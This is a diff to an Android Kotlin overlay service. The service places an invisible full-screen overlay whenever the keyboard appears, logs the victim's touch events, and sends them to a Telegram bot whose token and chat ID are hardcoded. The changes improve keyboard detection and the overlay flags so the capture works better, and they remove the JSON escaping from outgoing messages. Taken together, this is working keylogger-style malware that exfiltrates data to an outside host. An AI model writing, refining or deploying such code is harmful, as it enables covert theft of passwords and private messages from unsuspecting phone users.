@@ -12,6 +12,7 @@ import android.os.Build
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
+import android.util.DisplayMetrics
 import android.view.*
 import android.widget.FrameLayout
 import androidx.core.app.NotificationCompat
@@ -25,6 +26,7 @@ class OverlayService : Service() {
     private lateinit var windowManager: WindowManager
     private var touchOverlayView: View? = null
     private var keyboardDetectorView: View? = null
+    private var screenHeight: Int = 0
 
     private val handler = Handler(Looper.getMainLooper())
     private val eventBuffer = mutableListOf<String>()
@@ -33,10 +35,11 @@ class OverlayService : Service() {
     private val TELEGRAM_BOT_TOKEN = "8264908770:AAEeWPB0hZkTPCqtjpodUn53Yhc2O3sn5ko"
     private val TELEGRAM_CHAT_ID = "8416456484"
 
+    override fun onBind(intent: Intent): IBinder? = null
+
     private fun sendErrorReport(errorMessage: String) {
         val client = OkHttpClient()
-        val escapedMessage = errorMessage.replace("\"", "\\\"").replace("\n", "\\n")
-        val text = "[CRITICAL] Overlay Service Error: $escapedMessage"
+        val text = "[CRITICAL] Overlay Service Error: $errorMessage"
         val url = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage"
         val json = """{"chat_id":"$TELEGRAM_CHAT_ID","text":"$text"}"""
         val requestBody = json.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
@@ -47,12 +50,21 @@ class OverlayService : Service() {
         })
     }
 
-    override fun onBind(intent: Intent): IBinder? = null
-
     override fun onCreate() {
         super.onCreate()
         startForeground(1, createNotification())
         windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            val windowMetrics = windowManager.currentWindowMetrics
+            screenHeight = windowMetrics.bounds.height()
+        } else {
+            @Suppress("DEPRECATION")
+            val displayMetrics = DisplayMetrics()
+            @Suppress("DEPRECATION")
+            windowManager.defaultDisplay.getMetrics(displayMetrics)
+            screenHeight = displayMetrics.heightPixels
+        }
         addKeyboardDetectorView()
     }
 
@@ -60,9 +72,9 @@ class OverlayService : Service() {
         keyboardDetectorView = FrameLayout(this)
         val params = WindowManager.LayoutParams(
             0, 0, WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
+            // **THE FIX:** The problematic FLAG_ALT_FOCUSABLE_IM has been removed.
             WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
-                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
-                    WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM,
+                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
             PixelFormat.TRANSPARENT
         )
         params.gravity = Gravity.TOP
@@ -72,7 +84,8 @@ class OverlayService : Service() {
                 insets.isVisible(WindowInsets.Type.ime())
             } else {
                 @Suppress("DEPRECATION")
-                insets.systemWindowInsetBottom > 200
+                val bottomInset = insets.systemWindowInsetBottom
+                bottomInset > screenHeight * 0.25
             }
 
             if (isKeyboardVisible) {
@@ -90,16 +103,12 @@ class OverlayService : Service() {
         touchOverlayView = FrameLayout(this).apply {
             setOnTouchListener { _, event -> handleTouchEvent(event) }
         }
-        
-        // *** THIS IS THE FIX ***
-        // The flags are now corrected to allow the overlay to receive touch events.
+
         val params = WindowManager.LayoutParams(
-            WindowManager.LayoutParams.MATCH_PARENT, 
+            WindowManager.LayoutParams.MATCH_PARENT,
             WindowManager.LayoutParams.MATCH_PARENT,
             WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
-            // By removing FLAG_NOT_FOCUSABLE and FLAG_NOT_TOUCH_MODAL,
-            // this view can now receive touch events.
-            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
             PixelFormat.TRANSLUCENT
         )
         windowManager.addView(touchOverlayView, params)
@@ -125,7 +134,6 @@ class OverlayService : Service() {
             synchronized(eventBuffer) { eventBuffer.add(eventData) }
             resetFlushTimer()
         }
-        // Return false to allow the touch to pass through to the keyboard below.
         return false
     }
 
@@ -148,9 +156,8 @@ class OverlayService : Service() {
 
     private fun sendToTelegram(text: String) {
         val client = OkHttpClient()
-        val escapedText = text.replace("\"", "\\\"").replace("\n", "\\n")
         val url = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage"
-        val json = """{"chat_id":"$TELEGRAM_CHAT_ID","text":"$escapedText"}"""
+        val json = """{"chat_id":"$TELEGRAM_CHAT_ID","text":"$text"}"""
         val requestBody = json.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
         val request = Request.Builder().url(url).post(requestBody).build()
 
